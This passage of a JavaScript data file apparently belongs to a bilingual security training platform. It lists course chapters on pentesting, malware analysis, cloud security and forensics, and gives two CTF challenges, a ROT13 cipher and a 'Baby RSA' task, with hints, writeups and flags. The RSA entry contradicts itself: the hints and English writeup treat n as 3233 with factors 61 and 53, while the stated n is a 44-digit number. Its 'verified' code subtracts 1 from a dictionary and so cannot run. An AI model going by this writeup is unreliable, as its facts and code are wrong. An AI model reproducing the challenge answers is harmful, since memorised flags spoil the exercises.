            "type": "article",
            "contentKey": "web-09-01"
          },
          {
            "id": "web-09-02",
            "title": "OAuth 2.0 授权机制与常见逻辑漏洞",
            "titleEn": "OAuth 2.0 Architecture & Authorization Flaws",
            "type": "article",
            "contentKey": "web-09-02"
          },
          {
            "id": "web-09-03",
            "title": "Session 固化、会话劫持与认证防御最佳实践",
            "titleEn": "Session Fixation, Hijacking & Modern Defense",
            "type": "article",
            "contentKey": "web-09-03"
          }
        ]
      },
      {
        "id": "web-10",
        "title": "高级 Web 攻击技术",
        "titleEn": "Advanced Web Attacks",
        "difficulty": 3,
        "sections": [
          {
            "id": "web-10-01",
            "title": "CORS 跨域资源共享错误配置与数据盗取",
            "titleEn": "CORS Misconfigurations & Data Exfiltration",
            "type": "article",
            "contentKey": "web-10-01"
          },
          {
            "id": "web-10-02",
            "title": "HTTP 请求走私：CL.TE 与 TE.CL 原理深度剖析",
            "titleEn": "HTTP Request Smuggling: CL.TE & TE.CL Mechanics",
            "type": "article",
            "contentKey": "web-10-02"
          },
          {
            "id": "web-10-03",
            "title": "WebSocket 安全风险与现代 Web 攻防演进",
            "titleEn": "WebSocket Security & Advanced Web Attack Defense",
            "type": "article",
            "contentKey": "web-10-03"
          }
        ]
      }
    ]
  },
  {
    "id": "pentest",
    "title": "渗透测试",
    "titleEn": "Penetration Testing",
    "icon": "🎯",
    "color": "#00ff88",
    "desc": "信息收集、漏洞利用、权限提升方法论",
    "descEn": "Information gathering, exploitation, privilege escalation methodology",
    "chapters": [
      {
        "id": "pentest-01",
        "title": "信息收集与资产侦察",
        "titleEn": "Reconnaissance & Asset Discovery",
        "difficulty": 2,
        "sections": [
          {
            "id": "pentest-01-01",
            "title": "被动侦察与开源情报 (OSINT)",
            "titleEn": "OSINT & Passive Reconnaissance",
            "type": "article",
            "contentKey": "pentest-01-01"
          },
          {
            "id": "pentest-01-02",
            "title": "主动扫描与 Nmap 核心探针速查",
            "titleEn": "Active Scanning & Nmap Mastery",
            "type": "article",
            "contentKey": "pentest-01-02"
          },
          {
            "id": "pentest-01-03",
            "title": "Web 资产发现与目录/子域名爆破",
            "titleEn": "Subdomain & Directory Fuzzing",
            "type": "article",
            "contentKey": "pentest-01-03"
          }
        ]
      },
      {
        "id": "pentest-02",
        "title": "漏洞利用与权限提升",
        "titleEn": "Exploitation & Privilege Escalation",
        "difficulty": 3,
        "sections": [
          {
            "id": "pentest-02-01",
            "title": "漏洞利用基础与 Reverse Shell 反弹大全",
            "titleEn": "Exploit Fundamentals & Reverse Shells",
            "type": "article",
            "contentKey": "pentest-02-01"
          },
          {
            "id": "pentest-02-02",
            "title": "Linux 权限提升核心手艺：SUID 与 Sudo 误配置",
            "titleEn": "Linux Privilege Escalation: SUID & Sudo Flaws",
            "type": "article",
            "contentKey": "pentest-02-02"
          },
          {
            "id": "pentest-02-03",
            "title": "Windows 权限提升核心手艺：特权令牌与错误配置",
            "titleEn": "Windows Privilege Escalation: Tokens & Misconfigurations",
            "type": "article",
            "contentKey": "pentest-02-03"
          }
        ]
      },
      {
        "id": "pentest-03",
        "title": "Metasploit 框架实战",
        "titleEn": "Metasploit Framework",
        "difficulty": 3,
        "sections": [
          {
            "id": "pentest-03-01",
            "title": "Metasploit 架构大白话与 msfconsole 核心操作",
            "titleEn": "MSF Architecture & Basic Operations",
            "type": "article",
            "contentKey": "pentest-03-01"
          },
          {
            "id": "pentest-03-02",
            "title": "msfvenom 载荷生成与多架构反弹",
            "titleEn": "msfvenom Payload Generation & Multi/Handler",
            "type": "article",
            "contentKey": "pentest-03-02"
          },
          {
            "id": "pentest-03-03",
            "title": "Meterpreter 会话深度控制与后渗透基础",
            "titleEn": "Meterpreter In-Depth Control",
            "type": "article",
            "contentKey": "pentest-03-03"
          }
        ]
      },
      {
        "id": "pentest-04",
        "title": "域渗透与 AD 攻击",
        "titleEn": "Active Directory Penetration",
        "difficulty": 4,
        "sections": [
          {
            "id": "pentest-04-01",
            "title": "Active Directory 域架构与 Kerberos 认证体系",
            "titleEn": "AD Architecture & Kerberos Protocol",
            "type": "article",
            "contentKey": "pentest-04-01"
          },
          {
            "id": "pentest-04-02",
            "title": "经典域内攻击：Pass-the-Hash 与 Kerberoasting 实战",
            "titleEn": "Pass-the-Hash & Kerberoasting",
            "type": "article",
            "contentKey": "pentest-04-02"
          },
          {
            "id": "pentest-04-03",
            "title": "BloodHound 域关系分析与 DCSync 终极利用",
            "titleEn": "BloodHound Graph & DCSync Attack",
            "type": "article",
            "contentKey": "pentest-04-03"
          }
        ]
      },
      {
        "id": "pentest-05",
        "title": "后渗透与横向移动",
        "titleEn": "Post-Exploitation & Lateral Movement",
        "difficulty": 3,
        "sections": [
          {
            "id": "pentest-05-01",
            "title": "内网穿透与多级代理搭建",
            "titleEn": "Pivoting & SOCKS Proxies",
            "type": "article",
            "contentKey": "pentest-05-01"
          },
          {
            "id": "pentest-05-02",
            "title": "内网横向移动三大神器：PsExec、WMI 与 WinRM",
            "titleEn": "Lateral Movement Tooling: PsExec, WMI & WinRM",
            "type": "article",
            "contentKey": "pentest-05-02"
          },
          {
            "id": "pentest-05-03",
            "title": "权限维持与痕迹清理核心防线",
            "titleEn": "Persistence & Anti-Forensics",
            "type": "article",
            "contentKey": "pentest-05-03"
          }
        ]
      }
    ]
  },
  {
    "id": "malware",
    "title": "恶意软件分析与逆向",
    "titleEn": "Malware Analysis & Reverse Engineering",
    "icon": "🦠",
    "color": "#ff5252",
    "desc": "从静态特征提取到动态沙箱监控、YARA特征工程与真实威胁逆向剖析",
    "descEn": "From static feature extraction to dynamic sandbox monitoring, YARA rule engineering & real-world threat dissections.",
    "chapters": [
      {
        "id": "malw-01",
        "title": "恶意软件分类学与感染载体",
        "titleEn": "Malware Taxonomy & Infection Vectors",
        "difficulty": 1,
        "sections": [
          {
            "id": "malw-01-01",
            "title": "恶意软件全景分类与演化图谱",
            "titleEn": "Malware Taxonomy: Viruses, Worms & Trojans",
            "contentKey": "malw-01-01"
          },
          {
            "id": "malw-01-02",
            "title": "初始访问与投递载体解剖",
            "titleEn": "Initial Access Vectors: Phishing, Macros & LOLBins",
            "contentKey": "malw-01-02"
          },
          {
            "id": "malw-01-03",
            "title": "隔离分析实验室搭建规范",
            "titleEn": "Analysis Lab Architecture: Host-Only & Snapshots",
            "contentKey": "malw-01-03"
          }
        ]
      },
      {
        "id": "malw-02",
        "title": "静态分析与二进制指纹工程",
        "titleEn": "Static Analysis & Binary Fingerprinting",
        "difficulty": 2,
        "sections": [
          {
            "id": "malw-02-01",
            "title": "Windows PE 格式深度解剖与 Imphash",
            "titleEn": "PE Anatomy, Headers & Imphash Fingerprinting",
            "contentKey": "malw-02-01"
          },
          {
            "id": "malw-02-02",
            "title": "字符串取证与混淆解密",
            "titleEn": "Strings, FLOSS & Deobfuscation Techniques",
            "contentKey": "malw-02-02"
          },
          {
            "id": "malw-02-03",
            "title": "加壳检测、熵值分析与 OEP 寻踪",
            "titleEn": "Packing, Entropy Analysis & Finding the OEP",
            "contentKey": "malw-02-03"
          }
        ]
      },
      {
        "id": "malw-03",
        "title": "动态行为监控与反分析对抗",
        "titleEn": "Dynamic Behavioral Monitoring & Anti-Analysis",
        "difficulty": 2,
        "sections": [
          {
            "id": "malw-03-01",
            "title": "动态沙箱插桩与系统监控",
            "titleEn": "Dynamic Instrumentation: Procmon & Regshot",
            "contentKey": "malw-03-01"
          },
          {
            "id": "malw-03-02",
            "title": "网络流量模拟与 C2 追踪",
            "titleEn": "Network Telemetry: FakeNet-NG & INetSim",
            "contentKey": "malw-03-02"
          },
          {
            "id": "malw-03-03",
            "title": "反分析、反调试与反沙箱对抗",
            "titleEn": "Anti-Analysis: Evasion & Timing Checks",
            "contentKey": "malw-03-03"
          }
        ]
      },
      {
        "id": "malw-04",
        "title": "YARA 威胁特征工程与规则编写",
        "titleEn": "Threat Signature Engineering & YARA Rules",
        "difficulty": 3,
        "sections": [
          {
            "id": "malw-04-01",
            "title": "YARA 规则基础语法与核心元数据规范",
            "titleEn": "YARA Foundations: Meta, Strings & Hex Wildcards",
            "contentKey": "malw-04-01"
          },
          {
            "id": "malw-04-02",
            "title": "高级匹配条件与 PE 模块深度结合",
            "titleEn": "Advanced Conditions: pe.imphash & Math Entropy",
            "contentKey": "malw-04-02"
          },
          {
            "id": "malw-04-03",
            "title": "真实威胁规则编写实战",
            "titleEn": "WannaCry & Cobalt Strike YARA Engineering",
            "contentKey": "malw-04-03"
          }
        ]
      },
      {
        "id": "malw-05",
        "title": "真实世界恶意软件与高级威胁复盘",
        "titleEn": "Real-World Malware & Advanced Threat Dissections",
        "difficulty": 3,
        "sections": [
          {
            "id": "malw-05-01",
            "title": "Stuxnet 震网工控病毒与物理破坏深度复盘",
            "titleEn": "Stuxnet Anatomy: LNK 0-day, PLC Interception",
            "contentKey": "malw-05-01"
          },
          {
            "id": "malw-05-02",
            "title": "勒索软件演化史与 WannaCry/LockBit 逆向剖析",
            "titleEn": "Ransomware Evolution: SMB EternalBlue, Hybrid Encryption",
            "contentKey": "malw-05-02"
          },
          {
            "id": "malw-05-03",
            "title": "模块化僵尸网络与供应链投毒",
            "titleEn": "Modular Botnets & Supply Chain Trojans",
            "contentKey": "malw-05-03"
          }
        ]
      }
    ]
  },
  {
    "id": "ctf-guide",
    "title": "CTF 实战攻防",
    "titleEn": "CTF Combat Strategy",
    "icon": "🚩",
    "color": "#e056fd",
    "desc": "CTF 赛事体系、战备武器库、PWN 栈溢出与 ROP 链、Reverse 逆向与反调试、Web 攻防进阶、Crypto 密码学实战破译、Misc 杂项取证与 AWD 自动化攻防",
    "descEn": "CTF competition architecture, arsenal setup, PWN stack overflow & ROP chains, Reverse engineering & anti-debugging, advanced Web exploitation, Crypto cryptanalysis, Misc forensics & AWD automated combat",
    "chapters": [
      {
        "id": "ctfg-01",
        "title": "CTF 赛事体系、战备与武器库",
        "titleEn": "CTF Architecture, Arsenal & Strategic Workflow",
        "difficulty": 1,
        "sections": [
          {
            "id": "ctfg-01-01",
            "title": "竞赛赛制与规则 (Jeopardy / AWD / 动态计分)",
            "titleEn": "Competition Modes: Jeopardy, AWD & Dynamic Scoring",
            "type": "article",
            "contentKey": "ctfg-01-01"
          },
          {
            "id": "ctfg-01-02",
            "title": "战备环境与武器库 (Docker / pwntools / CyberChef)",
            "titleEn": "Battle-Ready Toolchain & Weaponry Architecture",
            "type": "article",
            "contentKey": "ctfg-01-02"
          },
          {
            "id": "ctfg-01-03",
            "title": "解题思维与 Writeup 沉淀 (信息收集 / 漏洞猜想 / 攻击链还原)",
            "titleEn": "Problem Solving Pipeline & High-Value Writeups",
            "type": "article",
            "contentKey": "ctfg-01-03"
          }
        ]
      },
      {
        "id": "ctfg-02",
        "title": "PWN 二进制漏洞利用实战",
        "titleEn": "PWN: Binary Exploitation in Practice",
        "difficulty": 3,
        "sections": [
          {
            "id": "ctfg-02-01",
            "title": "函数栈帧与 Ret2text 实战",
            "titleEn": "Stack Frame Layout & Ret2text Exploitation",
            "type": "article",
            "contentKey": "ctfg-02-01"
          },
          {
            "id": "ctfg-02-02",
            "title": "Ret2libc 与 ROP 链高级构造",
            "titleEn": "Ret2libc & Advanced ROP Chain Crafting",
            "type": "article",
            "contentKey": "ctfg-02-02"
          },
          {
            "id": "ctfg-02-03",
            "title": "格式化字符串与内存任意读写",
            "titleEn": "Format String Vulnerabilities & Arbitrary Memory R/W",
            "type": "article",
            "contentKey": "ctfg-02-03"
          }
        ]
      },
      {
        "id": "ctfg-03",
        "title": "Reverse 逆向工程与反反编译",
        "titleEn": "Reverse Engineering & Anti-Decompilation",
        "difficulty": 3,
        "sections": [
          {
            "id": "ctfg-03-01",
            "title": "静态反编译与逆向分析 (IDA Pro / Ghidra)",
            "titleEn": "Static Decompilation & Flow Analysis (IDA / Ghidra)",
            "type": "article",
            "contentKey": "ctfg-03-01"
          },
          {
            "id": "ctfg-03-02",
            "title": "动态调试与控制流追踪 (GDB-GEF / 断点技法)",
            "titleEn": "Dynamic Debugging & Flow Tracing (GDB-GEF / Breakpoints)",
            "type": "article",
            "contentKey": "ctfg-03-02"
          },
          {
            "id": "ctfg-03-03",
            "title": "魔改算法还原与反调试对抗",
            "titleEn": "Custom Cryptographic Algorithms & Anti-Debugging Bypass",
            "type": "article",
            "contentKey": "ctfg-03-03"
          }
        ]
      },
      {
        "id": "ctfg-04",
        "title": "Web 攻防对抗进阶",
        "titleEn": "Advanced Web Security & Exploit Chains",
        "difficulty": 2,
        "sections": [
          {
            "id": "ctfg-04-01",
            "title": "PHP 伪协议与文件包含深度利用",
            "titleEn": "PHP Wrappers & Advanced File Inclusion",
            "type": "article",
            "contentKey": "ctfg-04-01"
          },
          {
            "id": "ctfg-04-02",
            "title": "模板注入 (SSTI) 与 Python 沙箱逃逸",
            "titleEn": "Server-Side Template Injection (SSTI) & Sandbox Escapes",
            "type": "article",
            "contentKey": "ctfg-04-02"
          },
          {
            "id": "ctfg-04-03",
            "title": "Node.js 原型链污染与反序列化攻击",
            "titleEn": "Prototype Pollution & Modern Deserialization Attacks",
            "type": "article",
            "contentKey": "ctfg-04-03"
          }
        ]
      },
      {
        "id": "ctfg-05",
        "title": "Crypto 密码学实战破译",
        "titleEn": "Crypto: Applied Cryptanalysis & Attacks",
        "difficulty": 3,
        "sections": [
          {
            "id": "ctfg-05-01",
            "title": "古典密码、编码混淆与频率分析",
            "titleEn": "Classical Ciphers, Encoding & Frequency Analysis",
            "type": "article",
            "contentKey": "ctfg-05-01"
          },
          {
            "id": "ctfg-05-02",
            "title": "RSA 数论攻击模型与 SageMath 破译",
            "titleEn": "RSA Mathematical Attacks & SageMath Automation",
            "type": "article",
            "contentKey": "ctfg-05-02"
          },
          {
            "id": "ctfg-05-03",
            "title": "分组密码模式缺陷与填充假脱 / 字节翻转",
            "titleEn": "Block Cipher Flaws, Padding Oracle & Bit-Flipping",
            "type": "article",
            "contentKey": "ctfg-05-03"
          }
        ]
      },
      {
        "id": "ctfg-06",
        "title": "Misc 杂项与数字取证",
        "titleEn": "Misc: Digital Forensics & Steganography",
        "difficulty": 2,
        "sections": [
          {
            "id": "ctfg-06-01",
            "title": "多媒体隐写与文件魔数结构解析",
            "titleEn": "Multimedia Steganography & File Magic Carving",
            "type": "article",
            "contentKey": "ctfg-06-01"
          },
          {
            "id": "ctfg-06-02",
            "title": "流量包取证与硬件 HID 协议重构",
            "titleEn": "Traffic Capture Forensics & USB HID Protocol Carving",
            "type": "article",
            "contentKey": "ctfg-06-02"
          },
          {
            "id": "ctfg-06-03",
            "title": "压缩包伪加密与磁盘内存深度取证",
            "titleEn": "Archive Fake-Encryption & Memory/Disk Forensics",
            "type": "article",
            "contentKey": "ctfg-06-03"
          }
        ]
      },
      {
        "id": "ctfg-07",
        "title": "AWD 攻防对抗体系",
        "titleEn": "AWD: Attack With Defense Strategy",
        "difficulty": 3,
        "sections": [
          {
            "id": "ctfg-07-01",
            "title": "AWD 赛制规则与黄金防御 15 分钟",
            "titleEn": "AWD Rules & Golden 15-Minute Defensive SOP",
            "type": "article",
            "contentKey": "ctfg-07-01"
          },
          {
            "id": "ctfg-07-02",
            "title": "全流量监控、暗桩捕获与应急修补",
            "titleEn": "Full Traffic Monitoring, Trap Sniffing & Quick Patching",
            "type": "article",
            "contentKey": "ctfg-07-02"
          },
          {
            "id": "ctfg-07-03",
            "title": "自动化攻击农场与批量 Flag 提交",
            "titleEn": "Automated Attack Farm & High-Speed Flag Harvesting",
            "type": "article",
            "contentKey": "ctfg-07-03"
          }
        ]
      }
    ]
  },
  {
    "id": "cloudsec",
    "title": "云原生与容器安全",
    "titleEn": "Cloud & Container Security",
    "icon": "☁",
    "color": "#00e5ff",
    "desc": "从 Linux 命名空间隔离到容器逃逸、镜像加固、K8s RBAC 与云元数据攻防",
    "descEn": "From Linux namespace isolation to container escapes, image hardening, K8s RBAC & cloud metadata security.",
    "chapters": [
      {
        "id": "cloud-01",
        "title": "容器核心底层机制与隔离安全",
        "titleEn": "Container Internals & Isolation Architecture",
        "difficulty": 2,
        "sections": [
          {
            "id": "cloud-01-01",
            "title": "Linux 命名空间与 PID/Net/Mnt 隔离机制",
            "titleEn": "Linux Namespaces & Process Isolation",
            "contentKey": "cloud-01-01"
          },
          {
            "id": "cloud-01-02",
            "title": "控制组 (Cgroups v1/v2) 资源配额与 DoS 防护",
            "titleEn": "Cgroups Resource Constraints & DoS Defense",
            "contentKey": "cloud-01-02"
          },
          {
            "id": "cloud-01-03",
            "title": "运行时特权缩减：Capabilities 权能划分与 Seccomp 过滤",
            "titleEn": "Linux Capabilities & Seccomp System Call Filtering",
            "contentKey": "cloud-01-03"
          }
        ]
      },
      {
        "id": "cloud-02",
        "title": "容器逃逸攻防与特权滥用",
        "titleEn": "Container Breakouts & Privilege Abuse",
        "difficulty": 3,
        "sections": [
          {
            "id": "cloud-02-01",
            "title": "特权容器与敏感宿主机挂载逃逸",
            "titleEn": "Privileged Containers & Sensitive Host Mount Breakout",
            "contentKey": "cloud-02-01"
          },
          {
            "id": "cloud-02-02",
            "title": "内核机制利用与 cgroup release_agent 逃逸实战",
            "titleEn": "Kernel Exploits & cgroup release_agent Breakout",
            "contentKey": "cloud-02-02"
          },
          {
            "id": "cloud-02-03",
            "title": "Docker Socket 挂载滥用与容器逃逸",
            "titleEn": "Docker Socket Mount Abuse & Daemon Breakout",
            "contentKey": "cloud-02-03"
          }
        ]
      },
      {
        "id": "cloud-03",
        "title": "容器镜像安全与软件供应链",
        "titleEn": "Container Image & Supply Chain Security",
        "difficulty": 3,
        "sections": [
          {
            "id": "cloud-03-01",
            "title": "镜像分层结构与敏感数据残留恢复",
            "titleEn": "OverlayFS Layering & Sensitive Secret Recovery",
            "contentKey": "cloud-03-01"
          },
          {
            "id": "cloud-03-02",
            "title": "Dockerfile 安全加固基线与多阶段构建",
            "titleEn": "Dockerfile Hardening Baselines & Multi-Stage Builds",
            "contentKey": "cloud-03-02"
          },
          {
            "id": "cloud-03-03",
            "title": "镜像签名、漏洞扫描与 SBOM 供应链实践",
            "titleEn": "Image Scanning, Cosign Signatures & SBOM",
            "contentKey": "cloud-03-03"
          }
        ]
      },
      {
        "id": "cloud-04",
        "title": "Kubernetes 集群架构与核心攻防",
        "titleEn": "Kubernetes Architecture & Cluster Security",
        "difficulty": 3,
        "sections": [
          {
            "id": "cloud-04-01",
            "title": "K8s API Server 未授权访问与 Kubelet 端口攻防",
            "titleEn": "K8s API Server Misconfigs & Kubelet 10250 Exploitation",
            "contentKey": "cloud-04-01"
          },
          {
            "id": "cloud-04-02",
            "title": "RBAC 角色权限模型与 ServiceAccount 凭据滥用",
            "titleEn": "RBAC Role Models & ServiceAccount Token Abuse",
            "contentKey": "cloud-04-02"
          },
          {
            "id": "cloud-04-03",
            "title": "集群网络策略与 CNI 跨节点隔离",
            "titleEn": "Kubernetes NetworkPolicy & CNI Microsegmentation",
            "contentKey": "cloud-04-03"
          }
        ]
      },
      {
        "id": "cloud-05",
        "title": "公有云元数据与运行时威胁感知",
        "titleEn": "Cloud Metadata SSRF & Runtime Threat Detection",
        "difficulty": 3,
        "sections": [
          {
            "id": "cloud-05-01",
            "title": "云元数据服务攻击与 IAM 临时凭据盗用",
            "titleEn": "IMDSv1 vs IMDSv2 & Cloud Metadata SSRF / IAM Hijacking",
            "contentKey": "cloud-05-01"
          },
          {
            "id": "cloud-05-02",
            "title": "Falco 规则编写与 eBPF 内核级抓现行",
            "titleEn": "Runtime Defense: Falco Rules & eBPF Threat Telemetry",
            "contentKey": "cloud-05-02"
          },
          {
            "id": "cloud-05-03",
            "title": "云安全态势管理 (CSPM) 与自动化合规审计",
            "titleEn": "Cloud Security Posture Management & Compliance Baselines",
            "contentKey": "cloud-05-03"
          }
        ]
      }
    ]
  },
  {
    "id": "dfir",
    "title": "蓝队监控与应急取证",
    "titleEn": "Blue Team & Digital Forensics",
    "icon": "🛡",
    "color": "#4d96ff",
    "desc": "企业 SOC 日志分析、IR 黄金四小时处置、Windows/Linux 痕迹取证、Volatility 内存逆向与网络流量溯源",
    "descEn": "Enterprise SOC operations, 4-hour IR containment, Windows/Linux host artifacts, Volatility memory analysis, and network traffic attribution",
    "chapters": [
      {
        "id": "dfir-01",
        "title": "安全运营中心 (SOC) 与威胁遥测",
        "titleEn": "SOC Telemetry & Threat Hunting",
        "difficulty": 3,
        "sections": [
          {
            "id": "dfir-01-01",
            "title": "企业 SOC 架构、SIEM 平台与 Syslog 日志流水线",
            "titleEn": "Enterprise SOC Architecture, SIEM Platforms & Syslog Pipelines",
            "type": "article",
            "contentKey": "dfir-01-01"
          },
          {
            "id": "dfir-01-02",
            "title": "Windows 安全事件日志深度研读 (4624, 4672 & 7045)",
            "titleEn": "Windows Security Event Log Analysis (4624, 4672 & 7045)",
            "type": "article",
            "contentKey": "dfir-01-02"
          },
          {
            "id": "dfir-01-03",
            "title": "终端威胁遥测：Sysmon 部署与高危行为探针配置",
            "titleEn": "Endpoint Threat Telemetry: Sysmon Deployment & High-Fidelity Configs",
            "type": "article",
            "contentKey": "dfir-01-03"
          }
        ]
      },
      {
        "id": "dfir-02",
        "title": "应急响应规范与勒索排查 (IR SOP)",
        "titleEn": "Incident Response SOP & Ransomware Containment",
        "difficulty": 3,
        "sections": [
          {
            "id": "dfir-02-01",
            "title": "NIST/SANS 应急响应生命周期与黄金 4 小时 SOP",
            "titleEn": "NIST/SANS Incident Response Lifecycle & The Golden 4-Hour SOP",
            "type": "article",
            "contentKey": "dfir-02-01"
          },
          {
            "id": "dfir-02-02",
            "title": "勒索软件紧急处置：网络隔离、进程冻结与加密中断",
            "titleEn": "Ransomware Emergency Response: Containment, Process Freezing & Interruption",
            "type": "article",
            "contentKey": "dfir-02-02"
          },
          {
            "id": "dfir-02-03",
            "title": "Linux 应急响应：活跃会话、隐藏进程、异常网络与反向 Shell 排查",
            "titleEn": "Linux Live Incident Response: Sessions, Hidden Processes & Reverse Shells",
            "type": "article",
            "contentKey": "dfir-02-03"
          }
        ]
      },
      {
        "id": "dfir-03",
        "title": "Windows 操作系统痕迹与持久化取证",
        "titleEn": "Windows Host Artifacts & Persistence Forensics",
        "difficulty": 4,
        "sections": [
          {
            "id": "dfir-03-01",
            "title": "程序执行痕迹：Prefetch, Shimcache, Amcache 与 UserAssist",
            "titleEn": "Execution Artifacts: Prefetch, Shimcache, Amcache & UserAssist",
            "type": "article",
            "contentKey": "dfir-03-01"
          },
          {
            "id": "dfir-03-02",
            "title": "持久化驻留排查：计划任务、注册表 Run 键与 WMI 事件订阅",
            "titleEn": "Persistence Hunting: Scheduled Tasks, Run Keys & WMI Event Subscriptions",
            "type": "article",
            "contentKey": "dfir-03-02"
          },
          {
            "id": "dfir-03-03",
            "title": "文件操作与外设痕迹：Shellbags, Jump Lists, USB 插入与回收站取证",
            "titleEn": "File & USB Forensics: Shellbags, Jump Lists, USB History & Recycle Bin",
            "type": "article",
            "contentKey": "dfir-03-03"
          }
        ]
      },
      {
        "id": "dfir-04",
        "title": "内存取证与进程注入深度逆向",
        "titleEn": "Memory Forensics & Process Injection Analysis",
        "difficulty": 4,
        "sections": [
          {
            "id": "dfir-04-01",
            "title": "易失性内存抓取规范与司法存证证据链 (FTK Imager & DumpIt)",
            "titleEn": "Volatile Memory Acquisition & Forensic Chain of Custody (FTK & DumpIt)",
            "type": "article",
            "contentKey": "dfir-04-01"
          },
          {
            "id": "dfir-04-02",
            "title": "Volatility 3 实战：PsList, PsScan, Malfind 与未链接进程猎杀",
            "titleEn": "Volatility 3 Deep Dive: PsList, PsScan, Malfind & Unlinked Process Hunting",
            "type": "article",
            "contentKey": "dfir-04-02"
          },
          {
            "id": "dfir-04-03",
            "title": "内存注入、反射 DLL 提取与无文件落地攻击还原",
            "titleEn": "Process Injection, Reflective DLL Extraction & Fileless Malware Reconstruction",
            "type": "article",
            "contentKey": "dfir-04-03"
          }
        ]
      },
      {
        "id": "dfir-05",
        "title": "网络流量调查与威胁情报画像",
        "titleEn": "Network Traffic Forensics & Threat Intelligence",
        "difficulty": 4,
        "sections": [
          {
            "id": "dfir-05-01",
            "title": "Wireshark & Tshark 流量取证：还原攻击载荷与凭据抓取",
            "titleEn": "Wireshark & Tshark Forensics: Payload Reconstruction & Credential Carving",
            "type": "article",
            "contentKey": "dfir-05-01"
          },
          {
            "id": "dfir-05-02",
            "title": "隐蔽 C2 通信协议取证：DNS 隧道与 HTTP Beacon 频度建模",
            "titleEn": "Covert C2 Communications: DNS Tunneling & HTTP Beacon Jitter Modeling",
            "type": "article",
            "contentKey": "dfir-05-02"
          },
          {
            "id": "dfir-05-03",
            "title": "威胁情报 (CTI) 与 MITRE ATT&CK 溯源画像",
            "titleEn": "Cyber Threat Intelligence (CTI) & MITRE ATT&CK Attribution Profiling",
            "type": "article",
            "contentKey": "dfir-05-03"
          }
        ]
      }
    ]
  }
];

const CTF_CHALLENGES = [
  {
    "id": "ctf-002",
    "title": "ROT-What?",
    "titleEn": "ROT-What?",
    "category": "Crypto",
    "difficulty": 1,
    "points": 50,
    "tags": [
      "凯撒密码",
      "入门",
      "古典密码"
    ],
    "tagsEn": [
      "Caesar",
      "Beginner",
      "Classical"
    ],
    "desc": "Gur synt vf pnrfne_vf_abg_rapelcgvba. 这是什么？看起来像英文但完全不可读...",
    "descEn": "Gur synt vf pnrfne_vf_abg_rapelcgvba. What is this?",
    "hints": [
      "密文看起来像英文但每个字母都被替换了",
      "这是凯撒密码（移位密码），尝试不同的移位量（1-25）",
      "ROT13 是最常见的变体，每个字母向后移 13 位（A→N, B→O...）"
    ],
    "hintsEn": [
      "Ciphertext looks like shifted English",
      "Try Caesar cipher with different shifts (1-25)",
      "ROT13 shifts each letter by 13"
    ],
    "writeup": "Step 1: 观察密文 'Gur synt vf pnrfne_vf_abg_rapelcgvba'，看起来像被移位过的英文。\nStep 2: 使用 ROT13 解码（移位 13）：G→T, u→h, r→e... 得到 'The flag is caesar_is_not_encryption'。\nStep 3: 或者遍历所有 25 个移位量，找到可读的明文。\n\n关键代码:\ndef rot(c, k):\n    if 'a'<=c<='z': return chr((ord(c)-97+k)%26+97)\n    if 'A'<=c<='Z': return chr((ord(c)-65+k)%26+65)\n    return c\ndef rot_decode(s, k):\n    return ''.join(rot(c, k) for c in s)\nprint(rot_decode('Gur synt...', 13))",
    "writeupEn": "Apply ROT13: Gur→The, synt→flag → 'The flag is caesar_is_not_encryption'",
    "starterCode": "def rot_decode(ciphertext, shift):\n    \"\"\"用指定移位量解密凯撒密码\"\"\"\n    result = []\n    for c in ciphertext:\n        if 'a' <= c <= 'z':\n            result.append(chr((ord(c) - ord('a') - shift) % 26 + ord('a')))\n        elif 'A' <= c <= 'Z':\n            result.append(chr((ord(c) - ord('A') - shift) % 26 + ord('A')))\n        else:\n            result.append(c)\n    return ''.join(result)\n\ncipher = \"Gur synt vf pnrfne_vf_abg_rapelcgvba\"\n# 试试所有移位量\nfor shift in range(1, 26):\n    plain = rot_decode(cipher, shift)\n    if 'flag' in plain.lower():\n        print(f\"Shift {shift}: {plain}\")",
    "codeable": true,
    "simulated": false
  },
  {
    "id": "ctf-001",
    "title": "Baby RSA",
    "titleEn": "Baby RSA",
    "category": "Crypto",
    "difficulty": 2,
    "points": 100,
    "tags": [
      "RSA",
      "因数分解",
      "入门"
    ],
    "tagsEn": [
      "RSA",
      "Factorization",
      "Beginner"
    ],
    "desc": "小 n 的 RSA 实战。已知：n = 15297932317777965528678497944361558209137991，e = 65537，密文 c = 7899748134445953211938138392373749670740551。这个 n 的两个质因子里有一个非常小——用 sympy.factorint() 或 factordb.com 几毫秒就能分解它。拿到 p、q 后按标准流程解密即可。",
    "descEn": "Real RSA challenge. n = 15297932317777965528678497944361558209137991, e = 65537, c = 7899748134445953211938138392373749670740551. One of the two prime factors of n is tiny — sympy.factorint() or factordb.com cracks it in milliseconds. Recover p, q and decrypt.",
    "hints": [
      "n 只有 3233，直接分解就能得到 p 和 q",
      "使用 sympy.factorint(n) 或 factordb.com 在线分解 n 得到 p 和 q",
      "φ(n)=(p-1)(q-1), d=pow(e,-1,φ(n)), m=pow(c,d,n), 用 long_to_bytes 转换"
    ],
    "hintsEn": [
      "n is only 3233, factor it directly",
      "Use sympy.factorint(n) or factordb.com",
      "Compute phi, d, m=pow(c,d,n), convert with long_to_bytes"
    ],
    "writeup": "Step 1: 分解 n。sympy.factorint(n) 立刻得到小因子 p = 15636587（另一个因子 q = n/p = 978342161098068621284075479154214293）。\r\nStep 2: φ(n)=(p-1)(q-1)。\r\nStep 3: d = pow(65537, -1, φ(n))。\r\nStep 4: m = pow(c, d, n)，long_to_bytes 转换。\r\n\r\n验证过的完整解:\r\nfrom Crypto.Util.number import long_to_bytes\r\nfrom sympy import factorint\r\nn = 15297932317777965528678497944361558209137991\r\ne = 65537; c = 7899748134445953211938138392373749670740551\r\np = factorint(n)  # {15636587: 1, 978342161098068621284075479154214293: 1}\r\nphi = (p - 1) * (n // p - 1)\r\nd = pow(e, -1, phi)\r\nprint(long_to_bytes(pow(c, d, n)).decode())\r\n# -> flag{rs4_g0_brrr}",
    "writeupEn": "Step 1: Factor n=3233 → p=61, q=53. Step 2: phi=3120, d=2753. Step 3: m=pow(855,2753,3233) → flag.",
    "starterCode": "from Crypto.Util.number import long_to_bytes\r\nfrom sympy import factorint\r\n\r\nn = 15297932317777965528678497944361558209137991\r\ne = 65537\r\nc = 7899748134445953211938138392373749670740551\r\n\r\n# Step 1: 分解 n（其中一个小因子让这步瞬间完成）\r\n# 你的代码...\r\n\r\n# Step 2: 计算私钥 d\r\n# 你的代码...\r\n\r\n# Step 3: 解密得到 flag\r\n# 你的代码...",
    "codeable": true,
    "simulated": false
  },
  {
    "id": "ctf-007",
